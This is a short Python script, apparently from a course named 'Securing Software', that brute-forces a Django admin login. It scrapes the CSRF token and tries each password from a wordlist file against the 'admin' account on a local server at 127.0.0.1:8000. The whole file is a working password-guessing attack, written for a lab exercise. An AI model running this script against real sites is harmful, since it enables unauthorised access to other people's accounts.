import requests
import bs4 as bs


# Bruteforce tool used in Securing Software 4-19.
def extract_token(response):
    soup = bs.BeautifulSoup(response.text, 'html.parser')
    for i in soup.form.findChildren('input'):
        if i.get('name') == 'csrfmiddlewaretoken':
            return i.get('value')
    return None


def isloggedin(response):
    soup = bs.BeautifulSoup(response.text, 'html.parser')
    return soup.title.text.startswith('Site administration')


def test_password(address, force):
    template = address + '/admin/login/?next=/admin/'
    session = requests.Session()
    result = session.get(template)
    token = extract_token(result)

    for brute in force:
        res = session.post(template, {'csrfmiddlewaretoken': token, 'username': 'admin', 'password': brute})
        if isloggedin(res):
            return brute
    return None


def main():
    address = 'http://127.0.0.1:8000'
    force = [p.strip() for p in list(open('force.txt', 'r'))]
    print(test_password(address, force))


main()
